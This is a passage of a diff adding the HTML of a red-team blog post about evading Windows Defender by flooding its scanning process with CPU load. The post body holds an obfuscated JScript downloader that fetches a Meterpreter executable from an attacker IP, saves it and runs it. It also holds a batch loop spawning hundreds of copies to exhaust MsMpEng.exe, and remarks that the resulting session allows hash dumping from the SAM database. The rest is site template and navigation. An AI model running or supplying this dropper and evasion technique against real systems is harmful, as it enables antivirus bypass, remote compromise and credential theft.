+<span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">WScript.Shell</span><span class="dl">"</span><span class="p">).</span><span class="nc">Run</span><span class="p">(</span><span class="dl">"</span><span class="s2">met.exe</span><span class="dl">"</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Both the JS script and the downloaded Meterpreter payload are detected statically before execution.</p>
+
+<p>The first problem can be solved by using a public JS obfuscator, such as https://obfuscator.io/.</p>
+
+<p>The resulting script will look like this:</p>
+
+<div class="language-js highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">_0x17d249</span><span class="o">=</span><span class="nx">_0x1fcc</span><span class="p">;(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x8d99f4</span><span class="p">,</span><span class="nx">_0x5b012c</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0x2cbcff</span><span class="o">=</span><span class="nx">_0x1fcc</span><span class="p">,</span><span class="nx">_0x176630</span><span class="o">=</span><span class="nf">_0x8d99f4</span><span class="p">();</span><span class="k">while</span><span class="p">(</span><span class="o">!!</span><span class="p">[]){</span><span class="k">try</span><span class="p">{</span><span class="kd">var</span> <span class="nx">_0x516bb3</span><span class="o">=-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1f5</span><span class="p">))</span><span class="o">/</span><span class="mh">0x1</span><span class="o">+-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1ec</span><span class="p">))</span><span class="o">/</span><span class="mh">0x2</span><span class="o">+-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1e5</span><span class="p">))</span><span class="o">/</span><span class="mh">0x3</span><span class="o">*</span><span class="p">(</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1f2</span><span class="p">))</span><span class="o">/</span><span class="mh">0x4</span><span class="p">)</span><span class="o">+</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1e7</span><span class="p">))</span><span class="o">/</span><span class="mh">0x5</span><span class="o">+-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1e6</span><span class="p">))</span><span class="o">/</span><span class="mh">0x6</span><span class="o">*</span><span class="p">(</span><span class="o">-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1f3</span><span class="p">))</span><span class="o">/</span><span class="mh">0x7</span><span class="p">)</span><span class="o">+</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1ef</span><span class="p">))</span><span class="o">/</span><span class="mh">0x8</span><span class="o">+-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1ea</span><span class="p">))</span><span class="o">/</span><span class="mh">0x9</span><span class="o">*</span><span class="p">(</span><span class="o">-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1f1</span><span class="p">))</span><span class="o">/</span><span class="mh">0xa</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nx">_0x516bb3</span><span class="o">===</span><span class="nx">_0x5b012c</span><span class="p">)</span><span class="k">break</span><span class="p">;</span><span class="k">else</span> <span class="nx">_0x176630</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x176630</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());}</span><span class="k">catch</span><span class="p">(</span><span class="nx">_0x444b68</span><span class="p">){</span><span class="nx">_0x176630</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x176630</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());}}}(</span><span class="nx">_0x4958</span><span class="p">,</span><span class="mh">0x52d5f</span><span class="p">));</span><span class="kd">var</span> <span class="nx">url</span><span class="o">=</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1f8</span><span class="p">),</span><span class="nb">Object</span><span class="o">=</span><span class="nx">WScript</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1e4</span><span class="p">)](</span><span class="dl">'</span><span class="s1">MSXML2.XMLHTTP</span><span class="dl">'</span><span class="p">);</span><span class="nb">Object</span><span class="p">[</span><span class="dl">'</span><span class="s1">Open</span><span class="dl">'</span><span class="p">](</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1f6</span><span class="p">),</span><span class="nx">url</span><span class="p">,</span><span class="o">!</span><span class="p">[]),</span><span class="nb">Object</span><span class="p">[</span><span class="dl">'</span><span class="s1">Send</span><span class="dl">'</span><span class="p">]();</span><span class="k">if</span><span class="p">(</span><span class="nb">Object</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1e8</span><span class="p">)]</span><span class="o">==</span><span class="mh">0xc8</span><span class="p">){</span><span class="kd">var</span> <span class="nx">Stream</span><span class="o">=</span><span class="nx">WScript</span><span class="p">[</span><span class="dl">'</span><span class="s1">CreateObject</span><span class="dl">'</span><span class="p">](</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1ee</span><span class="p">));</span><span class="nx">Stream</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1f0</span><span class="p">)](),</span><span class="nx">Stream</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1e9</span><span class="p">)]</span><span class="o">=</span><span class="mh">0x1</span><span class="p">,</span><span class="nx">Stream</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1f4</span><span class="p">)](</span><span class="nb">Object</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1f9</span><span class="p">)]),</span><span class="nx">Stream</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1eb</span><span class="p">)]</span><span class="o">=</span><span class="mh">0x0</span><span class="p">,</span><span class="nx">Stream</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1f7</span><span class="p">)](</span><span class="dl">'</span><span class="s1">met.exe</span><span class="dl">'</span><span class="p">,</span><span class="mh">0x2</span><span class="p">),</span><span class="nx">Stream</span><span class="p">[</span><span class="dl">'</span><span class="s1">Close</span><span class="dl">'</span><span class="p">]();}</span><span class="kd">var</span> <span class="nx">r</span><span class="o">=</span><span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1fa</span><span class="p">))[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1ed</span><span class="p">)](</span><span class="dl">'</span><span class="s1">met.exe</span><span class="dl">'</span><span class="p">);</span><span class="kd">function</span> <span class="nf">_0x1fcc</span><span class="p">(</span><span class="nx">_0x5aab95</span><span class="p">,</span><span class="nx">_0x3af232</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0x495812</span><span class="o">=</span><span class="nf">_0x4958</span><span class="p">();</span><span class="k">return</span> <span class="nx">_0x1fcc</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x1fcc18</span><span class="p">,</span><span class="nx">_0xbf485</span><span class="p">){</span><span class="nx">_0x1fcc18</span><span class="o">=</span><span class="nx">_0x1fcc18</span><span class="o">-</span><span class="mh">0x1e4</span><span class="p">;</span><span class="kd">var</span> <span class="nx">_0xf5897c</span><span class="o">=</span><span class="nx">_0x495812</span><span class="p">[</span><span class="nx">_0x1fcc18</span><span class="p">];</span><span class="k">return</span> <span class="nx">_0xf5897c</span><span class="p">;},</span><span class="nf">_0x1fcc</span><span class="p">(</span><span class="nx">_0x5aab95</span><span class="p">,</span><span class="nx">_0x3af232</span><span class="p">);}</span><span class="kd">function</span> <span class="nf">_0x4958</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">_0x88af5</span><span class="o">=</span><span class="p">[</span><span class="dl">'</span><span class="s1">174024sBDVKk</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">6aCgHFV</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">2711895TrvrLm</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Status</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Type</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">9307413HbmAyM</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Position</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">792432hvPFro</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Run</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">ADODB.Stream</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">470216MBGiiE</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Open</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">10fGQDlo</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">36dgRipP</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">779387TmqUOV</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Write</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">489071HUhQcm</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">SaveToFile</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://10.8.8.8/met.exe</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">ResponseBody</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">WScript.Shell</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">CreateObject</span><span class="dl">'</span><span class="p">];</span><span class="nx">_0x4958</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span> <span class="nx">_0x88af5</span><span class="p">;};</span><span class="k">return</span> <span class="nf">_0x4958</span><span class="p">();}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Save it on the desktop as <code class="language-plaintext highlighter-rouge">obf.js</code> and attempt to execute it.</p>
+
+<p>Once again, the downloaded Meterpreter payload is detected, but this time, the JS script (obf.js) is not removed by Windows Security.</p>
+
+<h2 id="overloading-the-cpu"><span class="me-2">Overloading the CPU</span><a href="#overloading-the-cpu" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p><a href="https://i.imgur.com/5TR2Szu.png" class="popup img-link shimmer"><img src="https://i.imgur.com/5TR2Szu.png" alt="Catfender" loading="lazy"></a></p>
+
+<p>To successfully execute Meterpreter with this technique, we need to spam multiple <code class="language-plaintext highlighter-rouge">cscript.exe</code> processes running our <code class="language-plaintext highlighter-rouge">obf.js</code> script, which will exhaust the CPU due to Defender’s <code class="language-plaintext highlighter-rouge">MsMpEng.exe</code> process.</p>
+
+<p>This time, we will create a separate <code class="language-plaintext highlighter-rouge">launcher.bat</code> script that spawns multiple instances of our malicious JS payload execution via a for loop.</p>
+
+<div class="language-bat highlighter-rouge"><div class="code-header">
+        <span data-label-text="Bat"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>@echo <span class="na">off</span>
+<span class="k">for</span> <span class="na">/l </span><span class="vm">%%i</span> <span class="k">in</span> <span class="o">(</span><span class="m">1</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">500</span><span class="o">)</span> <span class="k">do</span> <span class="o">(</span>
+    <span class="nb">cscript</span> //nologo <span class="kd">obf</span>.js
+<span class="o">)</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>We can execute this batch script multiple times and wait a few seconds.</p>
+
+<div style="text-align: center;">
+  <video width="100%" height="auto" controls="" playsinline="" webkit-playsinline="" x-webkit-airplay="allow" style="max-width: 640px;">
+    <source src="https://i.imgur.com/Cr8xbD4.mp4" type="video/mp4" />
+    Your browser does not support the video tag.
+  </video>
+</div>
+
+<p>After some time, the Meterpreter session might terminate, but as demonstrated in the video, there is still sufficient time to perform migration, dump hashes from the SAM database, and carry out additional operations.</p>
+
+<hr />
+
+
+  </div>
+
+  <div class="post-tail-wrapper text-muted">
+    <!-- categories -->
+    
+      <div class="post-meta mb-3">
+        <i class="far fa-folder-open fa-fw me-1"></i>
+        
+          <a href="/categories/redteam/">REDTEAM</a>
+      </div>
+    
+
+    <!-- tags -->
+    
+      <div class="post-tags">
+        <i class="fa fa-tags fa-fw me-1"></i>
+        
+          <a
+            href="/tags/evasion/"
+            class="post-tag no-text-decoration"
+          >evasion</a>
+        
+          <a
+            href="/tags/meterpreter/"
+            class="post-tag no-text-decoration"
+          >meterpreter</a>
+        
+      </div>
+    
+
+    <div
+      class="
+        post-tail-bottom
+        d-flex justify-content-between align-items-center mt-5 pb-2
+      "
+    >
+      <div class="license-wrapper">
+        
+          
+
+          This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
+        
+      </div>
+
+      <!-- Post sharing snippet -->
+
+<div class="share-wrapper d-flex align-items-center">
+  <span class="share-label text-muted">Share</span>
+  <span class="share-icons">
+    
+    
+    
+
+    
+
+    <button
+      id="copy-link"
+      aria-label="Copy link"
+      class="btn small"
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Copy link"
+      data-title-succeed="Link copied successfully!"
+    >
+      <i class="fa-fw fas fa-link pe-none fs-6"></i>
+    </button>
+  </span>
+</div>
+
+    </div>
+    <!-- .post-tail-bottom -->
+  </div>
+  <!-- div.post-tail-wrapper -->
+</article>
+
+
+            
+          </main>
+
+          <!-- panel -->
+          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
+            <div class="access">
+              <!-- Get 5 last posted/updated posts -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <section id="access-lastmod">
+    <h2 class="panel-heading">Recently Updated</h2>
+    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/cybersecurity-home-lab/">Cybersecurity Home Lab</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/starving-defender/">Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/ref-she-run-pwsh/">Reflective shellcode runner in PowerShell</a>
+        </li>
+      
+    </ul>
+  </section>
+  <!-- #access-lastmod -->
+
+
+              <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/evasion/">evasion</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/meterpreter/">meterpreter</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">powershell</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/reflection/">reflection</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/shellcode/">shellcode</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/winapi/">winapi</a>
+      
+    </div>
+  </section>
+
+
+            </div>
+
+            
+              
+              
+
+
+
+
+
+
+  <div class="toc-border-cover z-3"></div>
+  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
+    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
+    <nav id="toc"></nav>
+  </section>
+
+
+            
+          </aside>
+        </div>
+
+        <div class="row">
+          <!-- tail -->
+          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              
+              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
+
+<!-- The total size of related posts -->
+
+
+<!-- An random integer that bigger than 0 -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+
+
+
+
+
+
+
+
+
+
+  <aside id="related-posts" aria-labelledby="related-label">
+    <h3 class="mb-4" id="related-label">Further Reading</h3>
+    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
+      
+        <article class="col">
+          <a href="/posts/ref-she-run-pwsh/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1750716000"
+  data-df="ll"
+  
+>
+  Jun 24, 2025
+</time>
+
+              <h4 class="pt-0 my-2">Reflective shellcode runner in PowerShell</h4>
+              <div class="text-muted">
+                <p>Part 1 - Understanding the mechanics  LookupFunc: finding Windows API modules and functions  We’ll examine how to call Windows API functions from PowerShell, starting with displaying a message box....</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+    </nav>
+  </aside>
+  <!-- #related-posts -->
+
+
+            
+              
+              <!-- Navigation buttons at the bottom of the post. -->
+
+<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
+  
+  
+
+  
+    <a
+      href="/posts/ref-she-run-pwsh/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>Reflective shellcode runner in PowerShell</p>
+    </a>
+  
+
+  
+    <a
+      href="/posts/cybersecurity-home-lab/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>Cybersecurity Home Lab</p>
+    </a>
+  
+</nav>
+
+            
+
+            <!-- Buy Me a Coffee Widget (Gray Style) -->
+<script data-name="BMC-Widget" data-cfasync="false" 
+  src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" 
+  data-id="1nnxrmxst" 
+  data-description="Support me on Buy me a coffee!" 
+  data-message="" 
+  data-color="#808080" 
+  data-position="Right" 
+  data-x_margin="18" 
+  data-y_margin="18">
+</script>
+
+          </div>
+        </div>
+
+        <!-- The Search results -->
+
+<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
+  <div class="col-11 content">
+    <div id="search-hints">
+      <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/evasion/">evasion</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/meterpreter/">meterpreter</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">powershell</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/reflection/">reflection</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/shellcode/">shellcode</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/winapi/">winapi</a>
+      
+    </div>
+  </section>
+
+
+    </div>
+    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+  </div>
+</div>
+
+      </div>
+
+      <aside aria-label="Scroll to Top">
+        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
+          <i class="fas fa-angle-up"></i>
+        </button>
+      </aside>
+    </div>
+
+    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>
+
+    
+      <aside
+  id="notification"
+  class="toast"
+  role="alert"
+  aria-live="assertive"
+  aria-atomic="true"
+  data-bs-animation="true"
+  data-bs-autohide="false"
+>
+  <div class="toast-header">
+    <button
+      type="button"
+      class="btn-close ms-auto"
+      data-bs-dismiss="toast"
+      aria-label="Close"
+    ></button>
+  </div>
+  <div class="toast-body text-center pt-0">
+    <p class="px-2 mb-3">A new version of content is available.</p>
+    <button type="button" class="btn btn-primary" aria-label="Update">
+      Update
+    </button>
+  </div>
+</aside>
+
+    
+
+    <!-- Embedded scripts -->
+
+    
+      
+      <!-- The comments switcher -->
+
+
+    
+
+    <!--
+  Jekyll Simple Search loader
+  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
+-->
+
+
+
+
+
+<script>
+  
+  document.addEventListener('DOMContentLoaded', () => {
+    SimpleJekyllSearch({
+      searchInput: document.getElementById('search-input'),
+      resultsContainer: document.getElementById('search-results'),
+      json: '/assets/js/data/search.json',
+      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
+      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
+      templateMiddleware: function(prop, value, template) {
+        if (prop === 'categories') {
+          if (value === '') {
+            return `${value}`;
+          } else {
+            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
+          }
+        }
+
+        if (prop === 'tags') {
+          if (value === '') {
+            return `${value}`;
+          } else {
+            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
+          }
+        }
+      }
+    });
+  });
+</script>
+
+  </body>
+</html>
+
